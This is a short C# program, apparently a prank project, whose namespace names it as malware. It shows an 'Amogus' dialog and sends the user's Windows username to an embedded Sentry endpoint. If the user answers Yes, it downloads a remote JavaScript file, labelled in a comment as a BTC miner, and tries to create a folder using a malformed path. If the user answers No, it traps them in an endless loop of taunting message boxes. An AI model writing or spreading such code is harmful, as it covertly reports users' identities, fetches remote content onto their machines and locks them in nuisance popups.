using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using Sentry;

using System.DirectoryServices.AccountManagement;

namespace LmaoMalware
{
    class Program
    {

       

        private static Random random = new Random();

        

        static void Main(string[] args)
        {

            using (SentrySdk.Init(o =>
            {
                o.Dsn = "https://251d52c31cc74befa66de61f3a053f11@o561860.ingest.sentry.io/6133335";
                // When configuring for the first time, to see what the SDK is doing:
                o.Debug = true;
                // Set traces_sample_rate to 1.0 to capture 100% of transactions for performance monitoring.
                // We recommend adjusting this value in production.
                o.TracesSampleRate = 1.0;
            }))
            {

                string message = "";
                string title = "Amogus";
                MessageBoxButtons buttons = MessageBoxButtons.YesNo;
                DialogResult result = MessageBox.Show(message, title, buttons);
                if (result == DialogResult.Yes)
                {
                    SentrySdk.CaptureMessage("User " + Environment.UserName + " Chose Yes");
                    var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
                    var stringChars = new char[8];
                    var random = new Random();

                    for (int i = 0; i < stringChars.Length; i++)
                    {
                        stringChars[i] = chars[random.Next(chars.Length)];
                    }

                    var finalString = new String(stringChars);

                    try
                    {
                        string pathString = @"c:\Users" + Environment.UserName + @"\" + finalString;
                        System.IO.Directory.CreateDirectory(pathString);
                    } catch (Exception ex)
                    {
                        SentrySdk.CaptureException(ex);
                    }
                    



                    //Console.WriteLine("Downloading BTC Miner");
                    using (var client = new WebClient())
                    {
                        client.DownloadFile("https://fourleafclover.company/_next/static/chunks/847-1989cc294de4947d5d6f.js", @"847-1989cc294de4947d5d6f.js");
                    }

                }
                else
                {
                    SentrySdk.CaptureMessage("User " + Environment.UserName + " Chose No");
                    while (true)
                    {
                        string message1 = "Lmao looser";
                        string title1 = "Amogus";
                        MessageBoxButtons buttons1 = MessageBoxButtons.YesNo;
                        DialogResult result1 = MessageBox.Show(message1, title1, buttons);
                    }

                }
            }


           

            
        }
    }
}
